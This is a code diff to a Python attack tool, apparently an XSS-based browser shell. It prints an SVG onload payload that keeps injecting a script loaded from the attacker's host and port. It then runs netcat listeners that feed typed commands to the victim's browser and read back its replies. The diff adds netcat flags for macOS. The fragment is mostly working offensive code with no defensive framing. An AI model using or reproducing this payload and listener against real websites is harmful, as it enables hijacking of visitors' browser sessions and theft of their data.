@@ -45,13 +45,17 @@ print ('%s Payload generated' % good)
 payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LHOST, LPORT)
 print (payload)
 print ('%s Waiting for the payload to be executed' % run)
+if 'darwin' in sys.platform:
+    NETCAT_COMMAND = 'nc -nvlk'
+else:
+    NETCAT_COMMAND = 'nc -nvlp'
 
 def shell():
-    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | timeout 1 nc -lp %s >/dev/null;' % LPORT)
+    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | sleep 1 && %s %s >/dev/null;' % (NETCAT_COMMAND, LPORT))
     shell()
 
 def status():
-    proc=Popen('timeout 1 nc -lp %s' % LPORT, shell=True, stdout=PIPE, )
+    proc = Popen('sleep 1 && %s %s' % (NETCAT_COMMAND, LPORT), shell=True, stdout=PIPE, )
     response = str(proc.communicate()[0])
     if 'Accept' in response:
         print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
